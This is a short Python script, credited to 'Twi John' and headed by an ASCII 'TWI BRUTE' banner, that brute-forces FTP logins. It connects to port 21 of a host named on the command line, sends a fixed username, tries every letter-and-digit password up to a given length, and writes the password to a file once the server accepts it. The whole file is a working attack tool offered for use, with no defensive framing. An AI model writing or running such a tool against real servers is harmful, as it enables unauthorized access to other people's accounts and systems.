#!/usr/bin/python
#Coded By Twi John
import socket
import sys, string
from itertools import product

     	

if len(sys.argv) !=3:
	print("Usage: "+ sys.argv[0] + " <host> <max caracters>")
        print("Ex: "+ sys.argv[0] + " 127.0.0.1 7")
	sys.exit(1)

img = """

 ______  __    __  ____      ____   ____   __ __  ______    ___
|      T|  T__T  Tl    j    |    \ |    \ |  T  T|      T  /  _]
|      ||  |  |  | |  T     |  o  )|  D  )|  |  ||      | /  [_
l_j  l_j|  |  |  | |  |     |     T|    / |  |  |l_j  l_jY    _]
  |  |  l  `  '  ! |  |     |  O  ||    \ |  :  |  |  |  |   [_
  |  |   \      /  j  l     |     ||  .  Yl     |  |  |  |     T
  l__j    \_/\_/  |____j    l_____jl__j\_j \__,_j  l__j  l_____j


Coded By Twi John


"""

host = sys.argv[1]
user = "atranat"
chars = "abcdefghijklmnopqrstuvxwyz0123456789"

print (img)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

x = False
erro = ""

s.connect((host, 21))
s.recv(1024)
while x != True:
	MAX_CHARS = int(sys.argv[2])
	for nletters in range(MAX_CHARS):
		for word in product(chars, repeat=nletters + 1):
		     try: 
			s.send("USER " + user +"\r\n")
 			s.recv(1024)
     			s.send('PASS '+''.join(word)+'\r\n')
       			print(''.join(word))
     			password = (''.join(word)+'\n')
     			erro = s.recv(3)
    		     	if erro == "230":
 				x = True	
				print("Password :"+ password)
				f = open("userpass.txt","w")
				f.write("Password :"+ password)
 			        sys.exit(2)
		     except socket.error:
			s.close()
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,21))
			s.send("USER " + user +"\r\n")
 			s.recv(1024)
     			s.send('PASS '+''.join(word)+'\r\n')
       			print(''.join(word))
     			password = (''.join(word)+'\n')
     			erro = s.recv(3)
			if erro == "230":
 				x = True	
				print("Password :"+ password)
				f = open("userpass.txt","w")
				f.write("Password :"+ password)
 			        sys.exit(2)
